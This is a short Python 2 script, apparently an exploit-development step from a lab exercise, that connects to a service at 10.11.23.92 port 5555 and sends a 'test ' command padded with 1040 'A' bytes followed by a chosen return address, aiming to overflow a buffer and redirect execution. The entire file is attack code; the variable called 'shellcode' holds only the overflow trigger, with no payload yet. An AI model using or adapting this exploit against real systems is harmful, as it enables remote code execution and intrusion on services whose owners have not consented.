#!/usr/bin/python
import sys
import socket

# 65d11d71 = \x71\x1d\xd1\x65
crash = "A" * 1040 + "\x71\x1d\xd1\x65"
shellcode = 'test ' + crash + '\r\n'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',5555))
	message=shellcode
	s.send(message)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 